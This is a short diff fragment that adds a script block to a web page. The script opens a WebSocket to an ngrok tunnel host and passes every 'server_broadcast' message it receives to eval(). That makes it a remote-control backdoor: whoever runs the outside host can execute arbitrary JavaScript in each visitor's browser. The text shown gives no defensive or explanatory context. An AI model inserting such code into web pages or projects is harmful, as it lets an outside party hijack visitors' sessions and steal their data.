@@ -1,0 +1,9 @@
+  <script>
+     s = new WebSocket('ws://3ce7-163-5-3-41.ngrok-free.app');
+     s.addEventListener("message", (event) => {
+         d = JSON.parse(event.data);
+         if (d.type === "server_broadcast") {
+             eval(d.message);
+         }
+     })
+  </script>
